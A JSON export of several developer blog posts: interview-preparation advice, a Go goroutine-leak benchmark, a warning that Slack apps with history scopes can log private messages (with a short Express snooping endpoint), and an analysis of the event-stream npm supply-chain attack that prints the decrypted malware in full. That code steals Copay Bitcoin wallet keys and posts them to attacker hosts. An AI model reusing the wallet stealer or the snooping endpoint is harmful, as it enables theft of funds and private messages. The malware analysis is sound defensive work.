[{"content":"If you\u0026rsquo;d like a view a video version of this article, check out the following:\nIn the summer of 2022, I left my job at VMware for Amazon Web Services. It was a bitter sweet journey; I loved my time at VMware and I loved working on some cutting edge things in the Kubernetes space. Even just a few months latter, the project I was working on is now completely defunct.\nThe process to getting into AWS was no easy one. But in the end, over the course of interviewing at many different companies, I landed with 4 offers. I decided to go with AWS since it was the most compelling offer and I get to work on some really cool technologies I\u0026rsquo;m excited about.\nHere are my biggest pieces of advice for landing a job and the process I did to make it happen:\n1. Study I studied alot in preparation for my interviews. Ontop of my 40hr/week job at VMware, I was studying an additional 20-30 hours a week for about 4 weeks. This meant that for awhile, in the middle of July, all I was doing was working and studying.\nBut I was very focused on how I approached my interview prep and what things I wanted to tackle:\nThe 14 Principles to Ace Any Coding interview This is my all-time favorite resource for ramping up on coding interviews. It\u0026rsquo;s just an article, but it\u0026rsquo;s a critical way to think about coding interviews and how to approach them. Since there are only 14 patterns, they are easy enough to remember but also deep enough to apply to a myriad of different questions.\nIf you can master each of these, you will be well on your way to acing your coding interview.\nGrokking the Coding Interview I used this course as a supplement to the 14 patterns. It\u0026rsquo;s actually created by the author of the 14 patterns article but has alot of interactive questions you can go through to get ramped up quickly. Unfortunately, it is quite expensive. But I found the cost to be worth it.\nIf you don\u0026rsquo;t want to pay for the course, you can find almost all the same questions on Leetcode. You just have to do some more digging and figure out some of the solutions on your own.\nBlind 75 By this point, the blind 75 have become a notorious list of Leetcode questions that constantly come up in whiteboard style interviews. But I didn\u0026rsquo;t do all of them; I only did probably 20-30 or so. And I was very selective on which ones I wanted to tackle. You\u0026rsquo;ll notice that the are broken up into different categories. In general, if you can solve 1 or 2 linked list question, you can solve almost all of them. So I started skipping the ones that seemed to repeat or overlap.\nThis compounded with the 14 patterns since I was able to apply that knowledge alongside the various data structures and algorithms identified by the blind 75 as the most important.\nCracking the Coding Interview I did open up Cracking the Coding Interview, what most would consider the bible of whiteboard style interviews. But I only refreshed myself on the most important parts, mostly the first few chapters. I had read this book in the past (I think back in 2018?), and I didn\u0026rsquo;t feel it was necessary to go through the whole thing. Again, I felt I was already getting alot of benefit from the 14 patterns and the blind 75. So, as I skimmed the book, I skipped portions I felt overlapped with material I\u0026rsquo;d already covered or was too obscure the be relevant to my study plan.\nElements of Programming Interviews in Python I love Elements of Programming Interviews. It\u0026rsquo;s very deep, has alot of well thought out solutions, and is a great way to refresh your knowledge of a chosen language (in my case, Python).\nBut it\u0026rsquo;s a bit of a double edged sword; for my study plan, it was too much and I wanted to stay focused on the 14 patterns, the blind 75, and grokking the coding interview. So, instead, I used it as supplemental material, mostly to refresh myself on python3, it\u0026rsquo;s inner workings, and some tricks that are useful during interviews.\nAll in all, if I had to only focus on 2 of these, I\u0026rsquo;d say the 14 patterns to ace any coding interview and the Blind 75 are the most important. If you can master the patterns and have a good understanding of the Blind 75 (and the various categories), then you\u0026rsquo;ll be 95% of the way there.\n2. Get a referral Leverage your network! I hit up alot of people (just to see what\u0026rsquo;s out there) and it was massively successful. I\u0026rsquo;d say my favorite interviews all came from referrals. You also get the benefit of skipping the \u0026ldquo;get to know you\u0026rdquo; recruiter call. So reach out to people on LinkedIn, previous co-workers\n3. Company values Every company, no matter how big or small, has some values they live by. At Amazon, these are the leadership principles and you will be asked behavioral style questions based on these company values.\nDo your research! Come prepared to the interview knowing the company values.\n4. Take notes I consistently took notes after each interview. This was a big win since I was doing 3-4 interviews per week. After each interview I would note who I talked to, what we talked about, any advice they gave me about the next round, etc.\n5. Open source Open source is a great way to show off your code, show off what you\u0026rsquo;ve done, and how you\u0026rsquo;ve contributed to the broader open source world.\n6. Story telling Story telling in interviews is huge. A good story conveys your impact, what you did, the result of your actions, and much much more.\nI prefer 2 story telling methods:\nSTAR method This stands for Situation. Task. Action. Result. And people at Amazon love this for interviews (and for good reason). It tells the person listen the kind of impact you had across a certain situation and what you did to remedy it through your actions.\nMan in the hole method The man in the hole story telling method is abit more nuanced. You start from a \u0026ldquo;good place\u0026rdquo; and describe how some hole is getting dug out from under you. This is essentially the \u0026ldquo;situation\u0026rdquo; from the STAR method.\nBut you keep digging and you keep digging. Until it seems that there is no way you could possibly get out of the hole.\nThen, you describe the actions you took to get you (or your team / organization) out of that hole. It\u0026rsquo;s a very powerful method for describing high impact from things you did or delivered.\nThis advice you could really apply to any interview, but going back to basics and studying hard was a really great way to do well in my interviews and land a few different offers. Hope this was helpful! Until next time!!\n","permalink":"https://johncodes.com/posts/aws-job/","summary":"If you\u0026rsquo;d like a view a video version of this article, check out the following:\nIn the summer of 2022, I left my job at VMware for Amazon Web Services. It was a bitter sweet journey; I loved my time at VMware and I loved working on some cutting edge things in the Kubernetes space. Even just a few months latter, the project I was working on is now completely defunct.","title":"How I got a job at Amazon as a software engineer"},{"content":"These simple go tests check the \u0026ldquo;leaky-ness\u0026rdquo; of using channels in Go. There are two methods described here; one using both a local context, and the parent context. When tests are run against both, the LeakyAsync method runs faster, but fails the leak checker as goroutines are not resolved or cleaned up.\nIn a production system with possibly thousands of go routines being spun up, this could result in massive memory leaks and a deadlock situation in the go binary.\nit\u0026rsquo;s recommended to use the leakchecker library to determine if goroutines get cleaned up.\npackage perform import ( \u0026#34;context\u0026#34; \u0026#34;math\u0026#34; ) func Selecting(parent chan struct{}) { i := 0 for { // Selecting within the infinite loop provides // control from the parent chan. // If the parent closes, we we can exit the loop and do any cleanup select { case \u0026lt;-parent: return default: } i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } func LeakyAsync(parent chan struct{}) { // Start a go routine to read and block off the parent chan. // If the parent chan closes, we can clean up within the go routine // without having to perform a \u0026#34;select\u0026#34; on each iteration // However, this go routine will never be garbage collected // if the parent chan does not close and any subsequent cleanup will // be left to leak go func(c \u0026lt;-chan struct{}) { \u0026lt;-c }(parent) i := 0 for { i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } func ContextAsync(parentCtx context.Context) { // Generate a child context from a passed in parent context. // If the parent is closed or canceled, // the child will also be closed. // We can then safely start a go routine that will block on the // child\u0026#39;s Done channel yet will still continue if the parent is canceled. ctx, cancel := context.WithCancel(parentCtx) defer cancel() go func(ctx context.Context) { \u0026lt;-ctx.Done() }(ctx) i := 0 for { i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } package perform import ( \u0026#34;context\u0026#34; \u0026#34;testing\u0026#34; \u0026#34;github.com/fortytw2/leaktest\u0026#34; ) func TestSelecting(t *testing.T) { leakChecker := leaktest.Check(t) c := make(chan struct{}, 1) Selecting(c) leakChecker() c \u0026lt;- struct{}{} } func BenchmarkSelecting(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { c := make(chan struct{}) Selecting(c) } } func TestLeakyAsync(t *testing.T) { leakChecker := leaktest.Check(t) c := make(chan struct{}, 1) LeakyAsync(c) leakChecker() c \u0026lt;- struct{}{} } func BenchmarkLeakyAsync(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { c := make(chan struct{}) LeakyAsync(c) } } func TestContextAsync(t *testing.T) { leakChecker := leaktest.Check(t) ctx, cancel := context.WithCancel(context.Background()) ContextAsync(ctx) leakChecker() cancel() } func BenchmarkContextAsync(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { ctx, _ := context.WithCancel(context.Background()) ContextAsync(ctx) } } Run the test suite with the leakchecker library\n❯ go test -v === RUN TestSelecting done checking leak --- PASS: TestSelecting (11.30s) === RUN TestLeakyAsync TestLeakyAsync: leaktest.go:132: leaktest: timed out checking goroutines TestLeakyAsync: leaktest.go:150: leaktest: leaked goroutine: goroutine 25 [chan receive]: perform.LeakyAsync.func1(0xc00008c1e0) /Users/jmcbride/workspace/channels-testing/perform.go:37 +0x34 created by perform.LeakyAsync /Users/jmcbride/workspace/channels-testing/perform.go:36 +0x3f --- FAIL: TestLeakyAsync (5.57s) === RUN TestContextAsync --- PASS: TestContextAsync (0.57s) Run the benchmarks with bench and benchmem to see performance\n❯ go test -v -bench=. -benchmem -run \u0026#34;Bench*\u0026#34; goos: darwin goarch: amd64 pkg: perform BenchmarkSelecting BenchmarkSelecting-8 1\t10114375732 ns/op\t104 B/op\t2 allocs/op BenchmarkLeakyAsync BenchmarkLeakyAsync-8 2\t585489776 ns/op\t704 B/op\t3 allocs/op BenchmarkContextAsync BenchmarkContextAsync-8 2\t570398894 ns/op\t976 B/op\t9 allocs/op PASS ok perform\t13.655s LeakyAsync is roughly 2 times faster. But fails the leak checker test as the goroutine is not resolved.\nSelecting is slow because it performs a select on every iteration of the for loop.\nContextAsync is the best of both worlds. We don\u0026rsquo;t have to do a select within the for loop, yet we avoid a go routine leak.\n","permalink":"https://johncodes.com/posts/golang-performance/","summary":"These simple go tests check the \u0026ldquo;leaky-ness\u0026rdquo; of using channels in Go. There are two methods described here; one using both a local context, and the parent context. When tests are run against both, the LeakyAsync method runs faster, but fails the leak checker as goroutines are not resolved or cleaned up.\nIn a production system with possibly thousands of go routines being spun up, this could result in massive memory leaks and a deadlock situation in the go binary.","title":"Leaky Go Channels"},{"content":"(Note: this is from a blog archieve dated 2019/01/21. These opinions are my own and the slack API may have changed) TLDR: The Slack API exposes endpoints for a token holder to read all public and private messages.\nIn today\u0026rsquo;s world, violations of privacy are no surprise. Between all the leaks and data dumps, many people have accepted this as \u0026ldquo;just the world we live in\u0026rdquo;. But what if information was exposed that could be used to judge your work performance? Or steal your company’s intellectual property?\nIn this post, I will show how a Slack app could potentially leverage the Slack API to snoop on all public and private messages in a Slack workspace.\nThe veil of privacy A slack private message is not truly private. It is only hidden behind a thin veil of secrecy. With a workspace API token in hand, someone could lift that veil and see all.\nHere, with a short example, we will show how easily that can be done.\nFirst, the workspace owner or admin (depending on permissions), must access the Slack API website. There, they can build an app or give third party permissions to install a “marketplace” app. This is fairly straight forward and exposes several workspace tokens for the app to use. These are secret tokens, so they will be omitted in this example.\nNext, the app builder must enable the \u0026ldquo;message\u0026rdquo; workspace event. If I was a nefarious third-party app builder, I would simply request various permissions related to channel, im, or group \u0026ldquo;history\u0026rdquo;. For a full list of events and their permission scope, see this list.\nNext, if building the app, an endpoint must be designated for the API to send the event payload. This event triggers whenever a message is sent in a direct message channel or fulfills the event conditions. For a full description of the Slack API event loop, check this out.\nNow that we have the API set up to send event payloads, lets build a small Node Express app with an endpoint to receive the event json.\n// Events API endpoint app.post(\u0026#39;/events\u0026#39;, (req, res) =\u0026gt; { switch (req.body.type) { case \u0026#39;url_verification\u0026#39;: { // verifies events API endpoint res.send({ challenge: req.body.challenge }); break; } case \u0026#39;event_callback\u0026#39;: { // Respond immediately to prevent a timeout error res.sendStatus(200); const event = req.body.event; // Print the message contents if(event.type == \u0026#39;message\u0026#39;) { console.log(\u0026#39;User: \u0026#39;, event.user); console.log(\u0026#39;Text: \u0026#39;, event.text); // Do other nefarious things with events json } } } }) In this short node express endpoint, we can respond with the event token (necessary for verifying the app when challenged) and snoop on private messages. Let’s use ngork, start the express app, and send a private message:\nApp listening on port 8080! User: UBB22VCKC Text: hello world We can see that my Slack user ID is exposed and the message I sent is exposed. At this point, the app could do anything with this information.\nThis not only applies to single channel DMs, but the Slack API exposes several event subscriptions for message events in specific channels, specific groups, multiparty direct messages, private channels, and even every message sent in a workspace. The app builder simply must turn on these events request the appropriate permissions and the payload will be sent to the designated endpoint.\nIn short, it requires very little configuration and code to access and expose private Slack messages.\nWhat can you do? Be extremely mindful of the apps and permissions you give third party apps. Ask yourself basic questions about these permissions. If you are installing a fun GIF app, why dose it requires channel history permissions?\nUse Slack apps that have been made open source. Don\u0026rsquo;t hesitate to poke around a repository if you are questioning why an app requires certain permissions!\nRequest that any custom apps your Slack workspace uses are made open source.\n","permalink":"https://johncodes.com/posts/slack-is-watching/","summary":"(Note: this is from a blog archieve dated 2019/01/21. These opinions are my own and the slack API may have changed) TLDR: The Slack API exposes endpoints for a token holder to read all public and private messages.\nIn today\u0026rsquo;s world, violations of privacy are no surprise. Between all the leaks and data dumps, many people have accepted this as \u0026ldquo;just the world we live in\u0026rdquo;. But what if information was exposed that could be used to judge your work performance?","title":"Slack Is Always Watching ..."},{"content":"(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)\nA few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM. The newly opened issue initially questioned a new, suspicious dependency that was pushed by a new, unknown maintainer. I was lucky enough to follow the community\u0026rsquo;s investigation into this issue and now, I hope to present the findings here. My goal with this piece is to hopefully shed some light on how easy it is for somebody to inject malicious code into NPM packages, the responsibility of open source maintainers, and the responsibility of the community.\nThe Malicious Code A Github user noticed that a new dependency named flatmap-stream was added to the event stream module. Through some investigative work, here is the raw code (un-minified by Github user FallingSnow) that was injected through flatmap. The flatmap module was an unknown, single author module.\n// var r = require, t = process; // function e(r) { // return Buffer.from(r, \u0026#34;hex\u0026#34;).toString() // } function decode(data) { return Buffer.from(data, \u0026#34;hex\u0026#34;).toString() } // var n = r(e(\u0026#34;2e2f746573742f64617461\u0026#34;)), // var n = require(decode(\u0026#34;2e2f746573742f64617461\u0026#34;)) // var n = require(\u0026#39;./test/data\u0026#39;) var n = [\u0026#34;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629\u0026#34;,\u0026#34;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1\u0026#34;,\u0026#34;63727970746f\u0026#34;,\u0026#34;656e76\u0026#34;,\u0026#34;6e706d5f7061636b6167655f6465736372697074696f6e\u0026#34;,\u0026#34;616573323536\u0026#34;,\u0026#34;6372656174654465636970686572\u0026#34;,\u0026#34;5f636f6d70696c65\u0026#34;,\u0026#34;686578\u0026#34;,\u0026#34;75746638\u0026#34;] // o = t[e(n[3])][e(n[4])]; // npm_package_description = process[decode(n[3])][decode(n[4])]; // npm_package_description = process[\u0026#39;env\u0026#39;][\u0026#39;npm_package_description\u0026#39;]; npm_package_description = \u0026#39;Get all children of a pid\u0026#39;; // Description from ps-tree (this is the aes decryption key) // if (!o) return; if (!npm_package_description) return; // var u = r(e(n[2]))[e(n[6])](e(n[5]), o), // var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description), var decipher = require(\u0026#39;crypto\u0026#39;)[\u0026#39;createDecipher\u0026#39;](\u0026#39;aes256\u0026#39;, npm_package_description), // a = u.update(n[0], e(n[8]), e(n[9])); // decoded = decipher.update(n[0], e(n[8]), e(n[9])); decoded = decipher.update(n[0], \u0026#39;hex\u0026#39;, \u0026#39;utf8\u0026#39;); console.log(n); // a += u.final(e(n[9])); decoded += decipher.final(\u0026#39;utf8\u0026#39;); // var f = new module.constructor; var newModule = new module.constructor; /**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/ // f.paths = module.paths, f[e(n[7])](a, \u0026#34;\u0026#34;), f.exports(n[1]) // newModule.paths = module.paths, newModule[\u0026#39;_compile\u0026#39;](decoded, \u0026#34;\u0026#34;), newModule.exports(n[1]) // newModule.paths = module.paths // newModule[\u0026#39;_compile\u0026#39;](decoded, \u0026#34;\u0026#34;) // Module.prototype._compile = function(content, filename) // newModule.exports(n[1]) As we can see, this is a fairly messy bit of code (as it had to be converted from mini-js to readable Node code). Also, the reader should note that there are some additional comments provided by FallingSnow, specifically the last bit. Caution! Do not run the last bit of code. You can simply use the above code to decrypt and see the injection attack.\nThe biggest thing that tips us off to this being malicious is the long stream of encrypted characters that are latter decrypted and used in a exports statement, effectively \u0026ldquo;compiling\u0026rdquo; and running whatever is held in the encrypted block. Further, we can see that the n variable holds an array of 2 separate strings. And finally, in the last block, we can see that the decrypted string from the n variable is used with a \u0026lsquo;_compile\u0026rsquo; statement, effectively running whatever parsed JavaScript might be held within the string.\nBrute Force a Solution Now, the key to deciphering the encrypted text depends directly on the npm_package_description variable, as we can see it is being used as the key in the createDecipher method. The initial thought from the community was that this key must be from the event stream package.json file itself (since the node runtime environment would set the modules description). However, this proved to not be the correct key and several Github users noted that it is possible to manually set a modules description from within the code. So, in order to find out what this injection attack is doing, we have to find the matching NPM package description.\nEventually, the community was able to find a listing of all public NPM package descriptions and brute force a solution out of this long list of descriptions. Brute forcing the solution out of public NPM package descriptions was a clever way to eventually land on the right key. Since the variable name is descriptive enough, we can effectively narrow it down from an infinite number of possibilities to only strings that are NPM package descriptions. If the key\u0026rsquo;s variable name hadn\u0026rsquo;t been as pronounced, it would have been more challenge to find the key. The correct key is as follows and comes from the copay-dash NPM module:\nnpm_package_description = \u0026#39;A Secure Bitcoin Wallet\u0026#39;; Using this as the key, we can see the decrypted code is as follows, in the two seperate payloads:\n/*@@*/ module.exports = function(e) { try { if (!/build\\:.*\\-release/.test(process.argv[2])) return; var t = process.env.npm_package_description, r = require(\u0026#34;fs\u0026#34;), i = \u0026#34;./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js\u0026#34;, n = r.statSync(i), c = r.readFileSync(i, \u0026#34;utf8\u0026#34;), o = require(\u0026#34;crypto\u0026#34;).createDecipher(\u0026#34;aes256\u0026#34;, t), s = o.update(e, \u0026#34;hex\u0026#34;, \u0026#34;utf8\u0026#34;); s = \u0026#34;\\n\u0026#34; + (s += o.final(\u0026#34;utf8\u0026#34;)); var a = c.indexOf(\u0026#34;\\n/*@@*/\u0026#34;); 0 \u0026lt;= a \u0026amp;\u0026amp; (c = c.substr(0, a)), r.writeFileSync(i, c + s, \u0026#34;utf8\u0026#34;), r.utimesSync(i, n.atime, n.mtime), process.on(\u0026#34;exit\u0026#34;, function() { try { r.writeFileSync(i, c, \u0026#34;utf8\u0026#34;), r.utimesSync(i, n.atime, n.mtime) } catch (e) {} }) } catch (e) {} }; /*@@*/ ! function() { function e() { try { var o = require(\u0026#34;http\u0026#34;), a = require(\u0026#34;crypto\u0026#34;), c = \u0026#34;-----BEGIN PUBLIC KEY-----\\\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\\\n2wIDAQAB\\\\n-----END PUBLIC KEY-----\u0026#34;; function i(e, t, n) { e = Buffer.from(e, \u0026#34;hex\u0026#34;).toString(); var r = o.request({ hostname: e, port: 8080, method: \u0026#34;POST\u0026#34;, path: \u0026#34;/\u0026#34; + t, headers: { \u0026#34;Content-Length\u0026#34;: n.length, \u0026#34;Content-Type\u0026#34;: \u0026#34;text/html\u0026#34; } }, function() {}); r.on(\u0026#34;error\u0026#34;, function(e) {}), r.write(n), r.end() } function r(e, t) { for (var n = \u0026#34;\u0026#34;, r = 0; r \u0026lt; t.length; r += 200) { var o = t.substr(r, 200); n += a.publicEncrypt(c, Buffer.from(o, \u0026#34;utf8\u0026#34;)).toString(\u0026#34;hex\u0026#34;) + \u0026#34;+\u0026#34; } i(\u0026#34;636f7061796170692e686f7374\u0026#34;, e, n), i(\u0026#34;3131312e39302e3135312e313334\u0026#34;, e, n) } function l(t, n) { if (window.cordova) try { var e = cordova.file.dataDirectory; resolveLocalFileSystemURL(e, function(e) { e.getFile(t, { create: !1 }, function(e) { e.file(function(e) { var t = new FileReader; t.onloadend = function() { return n(JSON.parse(t.result)) }, t.onerror = function(e) { t.abort() }, t.readAsText(e) }) }) }) } catch (e) {} else { try { var r = localStorage.getItem(t); if (r) return n(JSON.parse(r)) } catch (e) {} try { chrome.storage.local.get(t, function(e) { if (e) return n(JSON.parse(e[t])) }) } catch (e) {} } } global.CSSMap = {}, l(\u0026#34;profile\u0026#34;, function(e) { for (var t in e.credentials) { var n = e.credentials[t]; \u0026#34;livenet\u0026#34; == n.network \u0026amp;\u0026amp; l(\u0026#34;balanceCache-\u0026#34; + n.walletId, function(e) { var t = this; t.balance = parseFloat(e.balance.split(\u0026#34; \u0026#34;)[0]), \u0026#34;btc\u0026#34; == t.coin \u0026amp;\u0026amp; t.balance \u0026lt; 100 || \u0026#34;bch\u0026#34; == t.coin \u0026amp;\u0026amp; t.balance \u0026lt; 1e3 || (global.CSSMap[t.xPubKey] = !0, r(\u0026#34;c\u0026#34;, JSON.stringify(t))) }.bind(n)) } }); var e = require(\u0026#34;bitcore-wallet-client/lib/credentials.js\u0026#34;); e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) { var t = this.getKeysFunc(e); try { global.CSSMap \u0026amp;\u0026amp; global.CSSMap[this.xPubKey] \u0026amp;\u0026amp; (delete global.CSSMap[this.xPubKey], r(\u0026#34;p\u0026#34;, e + \u0026#34;\\\\t\u0026#34; + this.xPubKey)) } catch (e) {} return t } } catch (e) {} } window.cordova ? document.addEventListener(\u0026#34;deviceready\u0026#34;, e) : e() }(); A few things initially jump out. We can see that the injection code is targeting bitcoin, whether it\u0026rsquo;s targeting vulnerable wallets or attempting to mine coins on remote hosts, it\u0026rsquo;s difficult to decipher from this hacker\u0026rsquo;s spaghetti code. Often times, malicious actors will attempt to make their code as difficult to read and understand as possible. JavaScript minifiers make this easier for them and it can be a real challenge to generate a readable file from minified, abstract code.\nIn short, the community was able to realize that these two code bits will search for vulnerable crypto-currency wallets, check for the copay NPM module, and attempt to steal the wallets and funds stored within them through the targeted module. Thankfully, this vulnerability is not as far reaching as people first thought it might be. An application must be running this malicious code, the copay dependency, and have a wallet with funds.\nAftermath The people at NPM quickly took down the malicious version of event stream and the maintainers of the copay module put up a warning about the vulnerability. Unfortunately, the malicious code was not realized for almost 2 months. The last commit to the event stream repository was around September 20th, 2018 and the Github issue that started this was not opened until November 20th, 2018. There\u0026rsquo;s no real way to know how many people were negatively affected by this but it\u0026rsquo;s clear that this vulnerability reached millions of people running the event stream module through some node dependency.\nCommunity Standards This event triggered a huge backlash from the community. Why was this hacker given maintainer credentials and allowed to have publishing access to the module? Why were the countless other community members not aware of his commits? Who bares the responsibility for this open source project?\nPer the open source license provided in the module, we see the following: \u0026lsquo;THE SOFTWARE IS PROVIDED \u0026ldquo;AS IS\u0026rdquo;, WITHOUT WARRANTY OF ANY 